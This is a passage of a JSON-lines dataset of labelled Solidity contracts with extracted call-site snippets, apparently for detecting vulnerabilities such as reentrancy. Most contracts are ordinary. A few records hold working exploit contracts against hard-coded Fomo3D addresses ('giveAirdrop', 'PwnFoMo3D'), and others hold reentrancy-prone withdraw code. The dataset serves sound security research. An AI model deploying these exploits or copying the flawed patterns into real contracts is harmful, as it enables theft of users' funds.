"name\":\"position\",\"type\":\"bool\"},{\"indexed\":true,\"name\":\"voter\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"justification\",\"type\":\"string\"}],\"name\":\"Voted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"proposal\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"quorum\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"active\",\"type\":\"bool\"}],\"name\":\"ProposalTallied\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"member\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"isMember\",\"type\":\"bool\"}],\"name\":\"MembershipChanged\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"minimumQuorum\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"debatingPeriodInMinutes\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"majorityMargin\",\"type\":\"int256\"}],\"name\":\"ChangeOfRules\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"ReceivedEther\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"value\",\"type\":\"uint256\"},{\"indexed\":true,\"name\":\"token\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"extraData\",\"type\":\"bytes\"}],\"name\":\"ReceivedTokens\",\"type\":\"event\"}]'; } } contract Builder is Object { event Builded(address indexed client, address indexed instance); mapping(address => address[]) public getContractsOf; function getLastContract() constant returns (address) { var sender_contracts = getContractsOf[msg.sender]; return sender_contracts[sender_contracts.length - 1]; } address public beneficiary; function setBeneficiary(address _beneficiary) onlyOwner { beneficiary = _beneficiary; } uint public buildingCostWei; function setCost(uint _buildingCostWei) onlyOwner { buildingCostWei = _buildingCostWei; } string public securityCheckURI; function setSecurityCheck(string _uri) onlyOwner { securityCheckURI = _uri; } } contract BuilderCongress is Builder { function create(uint256 minimumQuorumForProposals, uint256 minutesForDebate, int256 marginOfVotesForMajority, address congressLeader, address _client) payable returns (address) { if (buildingCostWei > 0 && beneficiary != 0) { if (msg.value < buildingCostWei) throw; if (!beneficiary.send(buildingCostWei)) throw; if (msg.value > buildingCostWei) { if (!msg.sender.send(msg.value - buildingCostWei)) throw; } } else { if (msg.value > 0) { if (!msg.sender.send(msg.value)) throw; } } if (_client == 0) _client = msg.sender; if (congressLeader == 0) congressLeader = _client; var inst = CreatorCongress.create(minimumQuorumForProposals, minutesForDebate, marginOfVotesForMajority, congressLeader); inst.setOwner(_client); inst.setHammer(_client); getContractsOf[_client].push(inst); Builded(_client, inst); return inst; } } "}
{"sol name": "5629.sol", "label": 0, "first path": "constructor () public payable { fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1)); require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)()); (,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this)); require(winnings > 0.1 ether); fomo.withdraw(); selfdestruct(msg.sender); ", "second path": "constructor () public payable { fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1)); require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)()); (,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this)); require(winnings > 0.1 ether); fomo.withdraw(); selfdestruct(msg.sender); ", "third path": "constructor () public payable { fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1)); require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)()); (,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this)); require(winnings > 0.1 ether); fomo.withdraw(); selfdestruct(msg.sender); ", "long path": "pragma solidity ^0.4.6; pragma solidity ^0.4.24; contract fomo3d { function getPlayerInfoByAddress(address _addr) public view returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256); function withdraw() public; } contract giveAirdrop { constructor () public payable { fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1)); require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)()); (,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this)); require(winnings > 0.1 ether); fomo.withdraw(); selfdestruct(msg.sender); } function () public payable {} } contract AirdropTryer { address owner; giveAirdrop airdropper; constructor () public { owner = msg.sender; } function tryAirdrop() public payable{ airdropper = (new giveAirdrop).value(msg.value)(); } function empty() public { require(msg.sender == owner); selfdestruct(owner); } } "}
{"sol name": "3270.sol", "label": 0, "first path": "function gotake() public { if (fomo3d.getTimeLeft() > 50) { revert(); } address(fomo3d).call.value(fomo3d.getBuyPrice() *2 )(); fomo3d.withdraw(); ", "second path": "function gotake() public { if (fomo3d.getTimeLeft() > 50) { revert(); } address(fomo3d).call.value(fomo3d.getBuyPrice() *2 )(); fomo3d.withdraw(); ", "third path": "function gotake() public { if (fomo3d.getTimeLeft() > 50) { revert(); } address(fomo3d).call.value(fomo3d.getBuyPrice() *2 )(); fomo3d.withdraw(); ", "long path": "pragma solidity ^0.4.24; interface FoMo3DlongInterface { function getBuyPrice() public view returns(uint256) ; function getTimeLeft() public view returns(uint256) ; function withdraw() external; } contract Owned { address public owner; address public newOwner; event OwnershipTransferred(address indexed _from, address indexed _to); function Owned() public { owner = msg.sender; } modifier onlyOwner { require(msg.sender == owner); _; } function transferOwnership(address _newOwner) public onlyOwner { newOwner = _newOwner; } function acceptOwnership() public { require(msg.sender == newOwner); emit OwnershipTransferred(owner, newOwner); owner = newOwner; newOwner = address(0); } } contract PwnFoMo3D is Owned { FoMo3DlongInterface fomo3d; constructor() public payable { fomo3d  = FoMo3DlongInterface(0x0aD3227eB47597b566EC138b3AfD78cFEA752de5); } function gotake() public { if (fomo3d.getTimeLeft() > 50) { revert(); } address(fomo3d).call.value(fomo3d.getBuyPrice() *2 )(); fomo3d.withdraw(); } function withdrawOwner(uint256 a)  public onlyOwner { msg.sender.transfer(a); } } "}
{"sol name": "16925.sol", "label": 1, "first path": "function withdraw() public{ assert(msg.sender.call.value(balances[msg.sender])()) ; balances[msg.sender] = 0; ", "second path": "function withdraw() public{ assert(msg.sender.call.value(balances[msg.sender])()) ; balances[msg.sender] = 0; ", "third path": "function withdraw() public{ assert(msg.sender.call.value(balances[msg.sender])()) ; balances[msg.sender] = 0; ", "long path": "pragma solidity ^0.4.23; contract PoormansHoneyPot { mapping (address => uint) public balances; constructor() public payable { store(); } function store() public payable { balances[msg.sender] = msg.value; } function withdraw() public{ assert(msg.sender.call.value(balances[msg.sender])()) ; balances[msg.sender] = 0; } } "}
{"sol name": "21390.sol", "label": 1, "first path": "function FundTransfer(uint _am, bytes32 _operation, address _to, address _feeToAdr) payable  { if(msg.sender != address(this)) throw; if(_operation==\"In\")   { FundsMove(msg.value,\"In\",_to); investors[_to] += _am; }  else { uint amTotransfer = 0; if(_to==_feeToAdr) { amTotransfer=_am; }  else { amTotransfer=_am/100*99; investors[_feeToAdr]+=_am-amTotransfer; if(_to.call.value(_am)()==false) throw; investors[_to] -= _am; FundsMove(_am, \"Out\", _to); function() payable { In(msg.sender); function Out(uint amount) payable { if(investors[msg.sender]<targetAmount)throw; if(investors[msg.sender]<amount)throw; this.FundTransfer(amount,\"\",msg.sender,admin); function In(address to) payable { if(to==0x0)to = admin; if(msg.sender!=tx.origin)throw; this.FundTransfer(msg.value, \"In\", to,admin); ", "second path": "function FundTransfer(uint _am, bytes32 _operation, address _to, address _feeToAdr) payable  { if(msg.sender != address(this)) throw; if(_operation==\"In\")   { FundsMove(msg.value,\"In\",_to); investors[_to] += _am; }  else { uint amTotransfer = 0; if(_to==_feeToAdr) { amTotransfer=_am; }  else { amTotransfer=_am/100*99; investors[_feeToAdr]+=_am-amTotransfer; if(_to.call.value(_am)()==false) throw; investors[_to] -= _am; FundsMove(_am, \"Out\", _to); function() payable { In(msg.sender); function Out(uint amount) payable { if(investors[msg.sender]<targetAmount)throw; if(investors[msg.sender]<amount)throw; this.FundTransfer(amount,\"\",msg.sender,admin); function In(address to) payable { if(to==0x0)to = admin; if(msg.sender!=tx.origin)throw; this.FundTransfer(msg.value, \"In\", to,admin); ", "third path": "function FundTransfer(uint _am, bytes32 _operation, address _to, address _feeToAdr) payable  { if(msg.sender != address(this)) throw; if(_operation==\"In\")   { FundsMove(msg.value,\"In\",_to); investors[_to] += _am; }  else { uint amTotransfer = 0; if(_to==_feeToAdr) { amTotransfer=_am; }  else { amTotransfer=_am/100*99; investors[_feeToAdr]+=_am-amTotransfer; if(_to.call.value(_am)()==false) throw; investors[_to] -= _am; FundsMove(_am, \"Out\", _to); function() payable { In(msg.sender); function Out(uint amount) payable { if(investors[msg.sender]<targetAmount)throw; if(investors[msg.sender]<amount)throw; this.FundTransfer(amount,\"\",msg.sender,admin); function In(address to) payable { if(to==0x0)to = admin; if(msg.sender!=tx.origin)throw; this.FundTransfer(msg.value, \"In\", to,admin); ", "long path": "contract Accrual_account { address admin = msg.sender; uint targetAmount = 1 ether; mapping(address => uint) public investors; event FundsMove(uint amount,bytes32 typeAct,address adr); function changeAdmin(address _new) { if(_new==0x0)throw; if(msg.sender!=admin)throw; admin=_new; } function FundTransfer(uint _am, bytes32 _operation, address _to, address _feeToAdr) payable  { if(msg.sender != address(this)) throw; if(_operation==\"In\")   { FundsMove(msg.value,\"In\",_to); investors[_to] += _am; }  else { uint amTotransfer = 0; if(_to==_feeToAdr) { amTotransfer=_am; }  else { amTotransfer=_am/100*99; investors[_feeToAdr]+=_am-amTotransfer; } if(_to.call.value(_am)()==false) throw; investors[_to] -= _am; FundsMove(_am, \"Out\", _to); } } function() payable { In(msg.sender); } function Out(uint amount) payable { if(investors[msg.sender]<targetAmount)throw; if(investors[msg.sender]<amount)throw; this.FundTransfer(amount,\"\",msg.sender,admin); } function In(address to) payable { if(to==0x0)to = admin; if(msg.sender!=tx.origin)throw; this.FundTransfer(msg.value, \"In\", to,admin); } } "}
{"sol name": "2387.sol", "label": 1, "first path": "function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) { require(to != address(this) && data.length >= 68 &&   transfer(to, value)); assembly { mstore(add(data, 36), value) mstore(add(data, 68), caller) require(to.call.value(msg.value)(data)); return true; ", "second path": "function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) { require(to != address(this) && data.length >= 68 &&   transfer(to, value)); assembly { mstore(add(data, 36), value) mstore(add(data, 68), caller) require(to.call.value(msg.value)(data)); return true; ", "third path": "function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) { require(to != address(this) && data.length >= 68 &&   transfer(to, value)); assembly { mstore(add(data, 36), value) mstore(add(data, 68), caller) require(to.call.value(msg.value)(data)); return true; ", "long path": "pragma solidity ^0.4.24; pragma experimental \"v0.5.0\"; pragma experimental ABIEncoderV2; library AddressExtension { function isValid(address _address) internal pure returns (bool) { return 0 != _address; } function isAccount(address _address) internal view returns (bool result) { assembly { result := iszero(extcodesize(_address)) } } function toBytes(address _address) internal pure returns (bytes b) { assembly { let m := mload(0x40) mstore(add(m, 20), xor(0x140000000000000000000000000000000000000000, _address)) mstore(0x40, add(m, 52)) b := m } } } library Math { struct Fraction { uint256 numerator; uint256 denominator; } function isPositive(Fraction memory fraction) internal pure returns (bool) { return fraction.numerator > 0 && fraction.denominator > 0; } function mul(uint256 a, uint256 b) internal pure returns (uint256 r) { r = a * b; require((a == 0) || (r / a == b)); } function div(uint256 a, uint256 b) internal pure returns (uint256 r) { r = a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256 r) { require((r = a - b) <= a); } function add(uint256 a, uint256 b) internal pure returns (uint256 r) { require((r = a + b) >= a); } function min(uint256 x, uint256 y) internal pure returns (uint256 r) { return x <= y ? x : y; } function max(uint256 x, uint256 y) internal pure returns (uint256 r) { return x >= y ? x : y; } function mulDiv(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) { r = value * m; if (r / value == m) { r /= d; } else { r = mul(value / d, m); } } function mulDivCeil(uint256 value, uint256 m, uint256 d) internal pure returns (uint256 r) { r = value * m; if (r / value == m) { if (r % d == 0) { r /= d; } else { r = (r / d) + 1; } } else { r = mul(value / d, m); if (value % d != 0) { r += 1; } } } function mul(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDiv(x, f.numerator, f.denominator); } function mulCeil(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDivCeil(x, f.numerator, f.denominator); } function div(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDiv(x, f.denominator, f.numerator); } function divCeil(uint256 x, Fraction memory f) internal pure returns (uint256) { return mulDivCeil(x, f.denominator, f.numerator); } function mul(Fraction memory x, Fraction memory y) internal pure returns (Math.Fraction) { return Math.Fraction({ numerator: mul(x.numerator, y.numerator), denominator: mul(x.denominator, y.denominator) }); } } contract FsTKAuthority { function isAuthorized(address sender, address _contract, bytes data) public view returns (bool); function isApproved(bytes32 hash, uint256 approveTime, bytes approveToken) public view returns (bool); function validate() public pure returns (bytes4); } contract Authorizable { event SetFsTKAuthority(FsTKAuthority indexed _address); modifier onlyFsTKAuthorized { require(fstkAuthority.isAuthorized(msg.sender, this, msg.data)); _; } modifier onlyFsTKApproved(bytes32 hash, uint256 approveTime, bytes approveToken) { require(fstkAuthority.isApproved(hash, approveTime, approveToken)); _; } FsTKAuthority internal fstkAuthority; constructor(FsTKAuthority _fstkAuthority) internal { fstkAuthority = _fstkAuthority; } function setFsTKAuthority(FsTKAuthority _fstkAuthority) public onlyFsTKAuthorized { require(_fstkAuthority.validate() == _fstkAuthority.validate.selector); emit SetFsTKAuthority(fstkAuthority = _fstkAuthority); } } contract ERC20 { event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); function balanceOf(address owner) public view returns (uint256); function allowance(address owner, address spender) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); } contract SecureERC20 is ERC20 { event SetERC20ApproveChecking(bool approveChecking); function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool); function increaseAllowance(address spender, uint256 value) public returns (bool); function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool); function setERC20ApproveChecking(bool approveChecking) public; } contract FsTKToken { enum DelegateMode { PublicMsgSender, PublicTxOrigin, PrivateMsgSender, PrivateTxOrigin } event Consume(address indexed from, uint256 value, bytes32 challenge); event IncreaseNonce(address indexed from, uint256 nonce); event SetupDirectDebit(address indexed debtor, address indexed receiver, DirectDebitInfo info); event TerminateDirectDebit(address indexed debtor, address indexed receiver); event WithdrawDirectDebitFailure(address indexed debtor, address indexed receiver); event SetMetadata(string metadata); event SetLiquid(bool liquidity); event SetDelegate(bool isDelegateEnable); event SetDirectDebit(bool isDirectDebitEnable); struct DirectDebitInfo { uint256 amount; uint256 startTime; uint256 interval; } struct DirectDebit { DirectDebitInfo info; uint256 epoch; } struct Instrument { uint256 allowance; DirectDebit directDebit; } struct Account { uint256 balance; uint256 nonce; mapping (address => Instrument) instruments; } function spendableAllowance(address owner, address spender) public view returns (uint256); function transfer(uint256[] data) public returns (bool); function transferAndCall(address to, uint256 value, bytes data) public payable returns (bool); function nonceOf(address owner) public view returns (uint256); function increaseNonce() public returns (bool); function delegateTransferAndCall(uint256 nonce, uint256 fee, uint256 gasAmount, address to, uint256 value, bytes data, DelegateMode mode, uint8 v, bytes32 r, bytes32 s) public returns (bool); function directDebit(address debtor, address receiver) public view returns (DirectDebit); function setupDirectDebit(address receiver, DirectDebitInfo info) public returns (bool); function terminateDirectDebit(address receiver) public returns (bool); function withdrawDirectDebit(address debtor) public returns (bool); function withdrawDirectDebit(address[] debtors, bool strict) public returns (bool); } contract ERC20Like is SecureERC20, FsTKToken { using AddressExtension for address; using Math for uint256; modifier liquid { require(isLiquid); _; } modifier canUseDirectDebit { require(isDirectDebitEnable); _; } modifier canDelegate { require(isDelegateEnable); _; } bool public erc20ApproveChecking; bool public isLiquid = true; bool public isDelegateEnable; bool public isDirectDebitEnable; string public metadata; mapping(address => Account) internal accounts; constructor(string _metadata) public { metadata = _metadata; } function balanceOf(address owner) public view returns (uint256) { return accounts[owner].balance; } function allowance(address owner, address spender) public view returns (uint256) { return accounts[owner].instruments[spender].allowance; } function transfer(address to, uint256 value) public liquid returns (bool) { Account storage senderAccount = accounts[msg.sender]; senderAccount.balance = senderAccount.balance.sub(value); accounts[to].balance += value; emit Transfer(msg.sender, to, value); return true; } function transferFrom(address from, address to, uint256 value) public liquid returns (bool) { Account storage fromAccount = accounts[from]; Instrument storage senderInstrument = fromAccount.instruments[msg.sender]; fromAccount.balance = fromAccount.balance.sub(value); senderInstrument.allowance = senderInstrument.allowance.sub(value); accounts[to].balance += value; emit Transfer(from, to, value); return true; } function approve(address spender, uint256 value) public returns (bool) { Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender]; if (erc20ApproveChecking) { require((value == 0) || (spenderInstrument.allowance == 0)); } emit Approval( msg.sender, spender, spenderInstrument.allowance = value ); return true; } function setERC20ApproveChecking(bool approveChecking) public { emit SetERC20ApproveChecking(erc20ApproveChecking = approveChecking); } function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool) { Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender]; require(spenderInstrument.allowance == expectedValue); emit Approval( msg.sender, spender, spenderInstrument.allowance = newValue ); return true; } function increaseAllowance(address spender, uint256 value) public returns (bool) { Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender]; emit Approval( msg.sender, spender, spenderInstrument.allowance = spenderInstrument.allowance.add(value) ); return true; } function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool) { Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender]; uint256 currentValue = spenderInstrument.allowance; uint256 newValue; if (strict) { newValue = currentValue.sub(value); } else if (value < currentValue) { newValue = currentValue - value; } emit Approval( msg.sender, spender, spenderInstrument.allowance = newValue ); return true; } function setMetadata0(string _metadata) internal { emit SetMetadata(metadata = _metadata); } function setLiquid0(bool liquidity) internal { emit SetLiquid(isLiquid = liquidity); } function setDelegate(bool delegate) public { emit SetDelegate(isDelegateEnable = delegate); } function setDirectDebit(bool directDebit) public { emit SetDirectDebit(isDirectDebitEnable = directDebit); } function spendableAllowance(address owner, address spender) public view returns (uint256) { Account storage ownerAccount = accounts[owner]; return Math.min( ownerAccount.instruments[spender].allowance, ownerAccount.balance ); } function transfer(uint256[] data) public liquid returns (bool) { Account storage senderAccount = accounts[msg.sender]; uint256 totalValue; for (uint256 i = 0; i < data.length; i++) { address receiver = address(data[i] >> 96); uint256 value = data[i] & 0xffffffffffffffffffffffff; totalValue = totalValue.add(value); accounts[receiver].balance += value; emit Transfer(msg.sender, receiver, value); } senderAccount.balance = senderAccount.balance.sub(totalValue); return true; } function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) { require(to != address(this) && data.length >= 68 &&   transfer(to, value)); assembly { mstore(add(data, 36), value) mstore(add(data, 68), caller) } require(to.call.value(msg.value)(data)); return true; } function nonceOf(address owner) public view returns (uint256) { return accounts[owner].nonce; } function increaseNonce() public returns (bool) { emit IncreaseNonce(msg.sender, accounts[msg.sender].nonce += 1); } function delegateTransferAndCall(uint256 nonce, uint256 fee, uint256 gasAmount, address to, uint256 value, bytes data, DelegateMode mode, uint8 v, bytes32 r, bytes32 s) public liquid canDelegate returns (bool) { require(to != address(this)); address signer; address relayer; if (mode == DelegateMode.PublicMsgSender) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, address(0))), v, r, s ); relayer = msg.sender; } else if (mode == DelegateMode.PublicTxOrigin) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, address(0))), v, r, s ); relayer = tx.origin; } else if (mode == DelegateMode.PrivateMsgSender) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, msg.sender)), v, r, s ); relayer = msg.sender; } else if (mode == DelegateMode.PrivateTxOrigin) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, tx.origin)), v, r, s ); relayer = tx.origin; } else { revert(); } Account storage signerAccount = accounts[signer]; require(nonce == signerAccount.nonce); emit IncreaseNonce(signer, signerAccount.nonce += 1); signerAccount.balance = signerAccount.balance.sub(value.add(fee)); accounts[to].balance += value; if (fee != 0) { accounts[relayer].balance += fee; emit Transfer(signer, relayer, fee); } if (!to.isAccount() && data.length >= 68) { assembly { mstore(add(data, 36), value) mstore(add(data, 68), signer) } if (to.call.gas(gasAmount)(data)) { emit Transfer(signer, to, value); } else { signerAccount.balance += value; accounts[to].balance -= value; } } else { emit Transfer(signer, to, value); } return true; } function directDebit(address debtor, address receiver) public view returns (DirectDebit) { return accounts[debtor].instruments[receiver].directDebit; } function setupDirectDebit( address receiver, DirectDebitInfo info ) public returns (bool) { accounts[msg.sender].instruments[receiver].directDebit = DirectDebit({ info: info, epoch: 0 }); emit SetupDirectDebit(msg.sender, receiver, info); return true; } function terminateDirectDebit(address receiver) public returns (bool) { delete accounts[msg.sender].instruments[receiver].directDebit; emit TerminateDirectDebit(msg.sender, receiver); return true; } function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) { Account storage debtorAccount = accounts[debtor]; DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit; uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1); uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount); require(amount > 0); debtorAccount.balance = debtorAccount.balance.sub(amount); accounts[msg.sender].balance += amount; debit.epoch = epoch; emit Transfer(debtor, msg.sender, amount); return true; } function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) { Account storage receiverAccount = accounts[msg.sender]; result = true; uint256 total; for (uint256 i = 0; i < debtors.length; i++) { address debtor = debtors[i]; Account storage debtorAccount = accounts[debtor]; DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit; uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1); uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount); require(amount > 0); uint256 debtorBalance = debtorAccount.balance; if (amount > debtorBalance) { if (strict) { revert(); } result = false; emit WithdrawDirectDebitFailure(debtor, msg.sender); } else { debtorAccount.balance = debtorBalance - amount; total += amount; debit.epoch = epoch; emit Transfer(debtor, msg.sender, amount); } } receiverAccount.balance += total; } } contract ServiceVoucher is Authorizable, ERC20Like { uint256 public totalSupply; string public name; string public symbol; uint8 public constant decimals = 0; bool public constant isConsumable = true; constructor( FsTKAuthority _fstkAuthority, string _name, string _symbol, string _metadata ) Authorizable(_fstkAuthority) ERC20Like(_metadata) public { name = _name; symbol = _symbol; } function mint(address to, uint256 value) public liquid onlyFsTKAuthorized returns (bool) { totalSupply = totalSupply.add(value); accounts[to].balance += value; emit Transfer(address(0), to, value); return true; } function consume(address from, uint256 value) public liquid onlyFsTKAuthorized returns (bool) { Account storage fromAccount = accounts[from]; fromAccount.balance = fromAccount.balance.sub(value); totalSupply -= value; emit Consume(from, value, bytes32(0)); emit Transfer(from, address(0), value); return true; } function delegateConsume( uint256 nonce, uint256 fee, uint256 value, bytes32 challenge, DelegateMode mode, uint8 v, bytes32 r, bytes32 s ) public liquid canDelegate returns (bool) { require(value > 0); address signer; address relayer; if (mode == DelegateMode.PublicMsgSender) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, value, challenge, mode, address(0))), v, r, s ); relayer = msg.sender; } else if (mode == DelegateMode.PublicTxOrigin) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, value, challenge, mode, address(0))), v, r, s ); relayer = tx.origin; } else if (mode == DelegateMode.PrivateMsgSender) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, value, challenge, mode, msg.sender)), v, r, s ); relayer = msg.sender; } else if (mode == DelegateMode.PrivateTxOrigin) { signer = ecrecover( keccak256(abi.encodePacked(this, nonce, fee, value, challenge, mode, tx.origin)), v, r, s ); relayer = tx.origin; } else { revert(); } Account storage signerAccount = accounts[signer]; require(nonce == signerAccount.nonce); emit IncreaseNonce(signer, signerAccount.nonce += 1); signerAccount.balance = signerAccount.balance.sub(value.add(fee)); totalSupply -= value; emit Consume(signer, value, challenge); emit Transfer(signer, address(0), value); if (fee != 0) { accounts[relayer].balance += fee; emit Transfer(signer, relayer, fee); } return true; } function setMetadata(string infoUrl) public onlyFsTKAuthorized { setMetadata0(infoUrl); } function setLiquid(bool liquidity) public onlyFsTKAuthorized { setLiquid0(liquidity); } function setERC20ApproveChecking(bool approveChecking) public onlyFsTKAuthorized { super.setERC20ApproveChecking(approveChecking); } function setDelegate(bool delegate) public onlyFsTKAuthorized { super.setDelegate(delegate); } function setDirectDebit(bool directDebit) public onlyFsTKAuthorized { super.setDirectDebit(directDebit); } function transferToken(ERC20 erc20, address to, uint256 value) public onlyFsTKAuthorized { erc20.transfer(to, value); } } "}
{"sol name": "14458.sol", "label": 0, "first path": "function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){ require(_to != address(0)); if(isContract(_to)) { if(accountBalances[msg.sender].addressBalance < _value){ revert(); if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){ revert(); isNewRound(); subFromAddressBalancesInfo(msg.sender, _value); addToAddressBalancesInfo(_to, _value); assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value, _data); Transfer(msg.sender, _to, _value); return true; } else { return transferToAddress(msg.sender, _to, _value, _data); ", "second path": "function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){ require(_to != address(0)); if(isContract(_to)) { if(accountBalances[msg.sender].addressBalance < _value){ revert(); if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){ revert(); isNewRound(); subFromAddressBalancesInfo(msg.sender, _value); addToAddressBalancesInfo(_to, _value); assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value, _data); Transfer(msg.sender, _to, _value); return true; } else { return transferToAddress(msg.sender, _to, _value, _data); ", "third path": "function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){ require(_to != address(0)); if(isContract(_to)) { if(accountBalances[msg.sender].addressBalance < _value){ revert(); if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){ revert(); isNewRound(); subFromAddressBalancesInfo(msg.sender, _value); addToAddressBalancesInfo(_to, _value); assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value, _data); Transfer(msg.sender, _to, _value); return true; } else { return transferToAddress(msg.sender, _to, _value, _data); ", "long path": "pragma solidity ^0.4.18; contract SafeMath { function safeMul(uint256 a, uint256 b) public pure returns (uint256) { uint256 c = a * b; assert(a == 0 || c / a == b); return c; } function safeDiv(uint256 a, uint256 b) public pure returns (uint256) { return  a / b; } function safeSub(uint256 a, uint256 b) public pure returns (uint256) { assert(b <= a); return a - b; } function safeAdd(uint256 a, uint256 b) public pure returns (uint256) { uint256 c = a + b; assert(c>=a && c>=b); return c; } } contract ERC20 { function totalSupply() public constant returns (uint256); function balanceOf(address _owner) public constant returns (uint256); function transfer(address _to, uint256 _value) public returns (bool success); function transferFrom(address _from, address _to, uint256 _value) public returns (bool success); function approve(address _spender, uint256 _value) public returns (bool success); function allowance(address _owner, address _spender) public constant returns (uint256); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract ContractReceiver { function tokenFallback(address _from, uint256 _value, bytes _data) public; } contract ERC223 is ERC20 { function transfer(address _to, uint256 _value, bytes _data) public returns (bool success); function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public returns (bool success); event Transfer(address indexed _from, address indexed _to, uint256 _value, bytes _data); } contract BankeraToken is ERC223, SafeMath { string public constant name = \"Banker Token\"; string public constant symbol = \"BNK\"; uint8 public constant decimals = 8; uint256 private issued = 0; uint256 private totalTokens = 25000000000 * 100000000; address private contractOwner; address private rewardManager; address private roundManager; address private issueManager; uint64 public currentRound = 0; bool public paused = false; mapping (uint64 => Reward) public reward; mapping (address => AddressBalanceInfoStructure) public accountBalances; mapping (uint64 => uint256) public issuedTokensInRound; mapping (address => mapping (address => uint256)) internal allowed; uint256 public blocksPerRound; uint256 public lastBlockNumberInRound; struct Reward { uint64 roundNumber; uint256 rewardInWei; uint256 rewardRate; bool isConfigured; } struct AddressBalanceInfoStructure { uint256 addressBalance; mapping (uint256 => uint256) roundBalanceMap; mapping (uint64 => bool) wasModifiedInRoundMap; uint64[] mapKeys; uint64 claimedRewardTillRound; uint256 totalClaimedReward; } function BankeraToken(uint256 _blocksPerRound, uint64 _round) public { contractOwner = msg.sender; lastBlockNumberInRound = block.number; blocksPerRound = _blocksPerRound; currentRound = _round; } function() public whenNotPaused payable { } function tokenFallback(address _from, uint256 _value, bytes _data) public whenNotPaused view { revert(); } function setReward(uint64 _roundNumber, uint256 _roundRewardInWei) public whenNotPaused onlyRewardManager { isNewRound(); Reward storage rewardInfo = reward[_roundNumber]; assert(rewardInfo.roundNumber == 